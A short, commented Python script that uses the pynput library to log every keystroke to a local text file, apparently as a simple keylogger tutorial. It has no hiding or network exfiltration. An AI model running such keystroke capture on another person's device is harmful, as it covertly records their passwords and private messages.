# Import necessary module from the pynput library (if not installed - 'pip install pynput' in the terminal)
from pynput.keyboard import Listener

# Define the log file where keystrokes will be saved
log_file = "log.txt"

# Function to handle the event of a key being pressed
def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

# Set up the listener to monitor keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()